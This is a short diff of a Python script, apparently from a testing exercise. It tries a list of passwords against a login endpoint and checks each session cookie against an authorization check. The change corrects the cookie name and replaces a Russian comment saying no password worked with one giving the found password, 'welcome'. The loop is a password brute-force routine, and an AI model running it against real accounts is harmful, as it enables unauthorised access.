@@ -34,10 +34,10 @@ for password in list_passwords:
     my_cookies = response.cookies.get("auth_cookie")
     print(my_cookies)
 
-    response_2 = requests.get(check_cookie, cookies={"cookie": my_cookies})
+    response_2 = requests.get(check_cookie, cookies={"auth_cookie": my_cookies})
     if response_2.text == "You are authorized":
         print(password)
         print(response_2.text)
         break
 
-# Перебрал все пароли, но правильного не оказалось, увы успешного ответа не получилось.
+# Правильный пароль: welcome
